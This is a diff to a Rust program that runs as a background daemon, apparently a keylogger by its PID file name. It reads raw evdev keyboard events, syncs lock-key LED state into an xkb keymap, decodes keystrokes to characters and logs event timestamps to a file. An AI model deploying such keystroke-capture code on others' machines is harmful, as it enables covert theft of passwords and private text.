@@ -6,14 +6,14 @@ use std::{
 
 use anyhow::{bail, Context, Result};
 use daemonize::{Daemonize, Outcome};
-use evdev::{Device, EventType, InputEvent, InputEventKind};
+use evdev::{Device, InputEvent, InputEventKind, Key, LedType};
 use log::{debug, error, info, trace};
 use rustix::process::{kill_process, Pid, RawPid, Signal};
 use tokio::{
     sync::mpsc::{self, Receiver},
     task::JoinSet,
 };
-use xkbcommon::xkb::{self, Keycode, State, CONTEXT_NO_FLAGS};
+use xkbcommon::xkb::{self, KeyDirection, Keycode, Keymap, State, CONTEXT_NO_FLAGS};
 
 const PID_FILE_PATH: &str = "/run/keylogger.pid";
 
@@ -78,21 +78,52 @@ async fn start_logger(log_file: std::fs::File) -> Result<()> {
     bail!("Unkown error occured");
 }
 
-fn get_keyboard_state() -> Result<State> {
+const LEDS: [LedType; 3] = [LedType::LED_CAPSL, LedType::LED_NUML, LedType::LED_SCROLLL];
+
+fn get_keyboard_state() -> Result<(State, Keymap)> {
     let context = xkb::Context::new(CONTEXT_NO_FLAGS);
 
     let keymap = xkb::Keymap::new_from_names(
         &context,
         "",                                       // rules
-        "pc105",                                  // model
+        "pc104",                                  // model
         "us",                                     // layout
-        "intl",                                   // variant
+        "basic",                                  // variant
         Some("grp:win_space_toggle".to_string()), // options
         xkb::COMPILE_NO_FLAGS,
     )
     .context("Failed to create keymap")?;
 
-    Ok(xkb::State::new(&keymap))
+    let mut state = xkb::State::new(&keymap);
+
+    let led_device = evdev::enumerate()
+        .map(|t| t.1)
+        .find(|d| {
+            let Some(leds) = d.supported_leds() else {
+                return false;
+            };
+            LEDS.iter().all(|k| leds.contains(*k))
+        })
+        .context("Failed to find led device")?;
+
+    let leds_state = led_device
+        .get_led_state()
+        .context("Failed to get led state")?;
+
+    for led in &leds_state {
+        let key = match led {
+            LedType::LED_CAPSL => Key::KEY_CAPSLOCK,
+            LedType::LED_NUML => Key::KEY_NUMLOCK,
+            LedType::LED_SCROLLL => Key::KEY_SCROLLLOCK,
+            _ => continue,
+        };
+        let keycode = key_to_keycode(key);
+
+        state.update_key(keycode, KeyDirection::Down);
+        state.update_key(keycode, KeyDirection::Up);
+    }
+
+    Ok((state, keymap))
 }
 
 fn spawn_device_listeners(devices: Vec<Device>) -> (Receiver<InputEvent>, JoinSet<Result<()>>) {
@@ -115,10 +146,52 @@ fn spawn_device_listeners(devices: Vec<Device>) -> (Receiver<InputEvent>, JoinSe
     (rx, join_set)
 }
 
+#[derive(PartialEq)]
+enum KeyEventType {
+    KeyPress,
+    Release,
+    Repeat,
+}
+
+fn key_to_keycode(key: Key) -> Keycode {
+    // We add 8 to translate the linux keycode to the xkb keycode. Why? because it works.
+    // Why???? For historical reasons
+    // <https://xkbcommon.org/doc/current/keymap-text-format-v1.html#autotoc_md26>
+    // THE FUCK
+    (u32::from(key.0) + 8).into()
+}
+
 fn event_reader(mut rx: Receiver<InputEvent>, mut log_file: std::fs::File) -> Result<()> {
-    let state: State = get_keyboard_state().context("Failed to initialize keyboard state")?;
+    let (mut state, keymap) =
+        get_keyboard_state().context("Failed to initialize keyboard state")?;
 
     while let Some(eventr) = rx.blocking_recv() {
+        let InputEventKind::Key(key) = eventr.kind() else {
+            continue;
+        };
+        let keycode = key_to_keycode(key);
+        let press_type = match eventr.value() {
+            0 => KeyEventType::Release,
+            1 => KeyEventType::KeyPress,
+            2 => KeyEventType::Repeat,
+            _ => unreachable!(),
+        };
+
+        if press_type == KeyEventType::Repeat && !keymap.key_repeats(keycode) {
+            continue;
+        }
+
+        if press_type != KeyEventType::Repeat {
+            let direction = if press_type == KeyEventType::KeyPress {
+                KeyDirection::Down
+            } else {
+                KeyDirection::Up
+            };
+            state.update_key(keycode, direction);
+        }
+
+        let key = state.key_get_utf8(keycode);
+
         let time = eventr.timestamp();
         let t = time
             .duration_since(UNIX_EPOCH)
@@ -127,18 +200,6 @@ fn event_reader(mut rx: Receiver<InputEvent>, mut log_file: std::fs::File) -> Re
         log_file
             .write_all(format!("{t}\n").as_bytes())
             .context("Failed to write to log")?;
-        if eventr.event_type() != EventType::KEY {
-            continue;
-        }
-        // We add 8 to translate the linux keycode to the xkb keycode. Why? because it works.
-        // Why???? For historical reasons
-        // <https://xkbcommon.org/doc/current/keymap-text-format-v1.html#autotoc_md26>
-        // THE FUCK
-        let keycode = Keycode::new(u32::from(eventr.code()) + 8);
-        trace!("{keycode:?}");
-        let key = state.key_get_utf8(keycode);
-        trace!("{eventr:?}");
-        info!("{key:?}");
     }
     bail!("Event receiver was closed")
 }
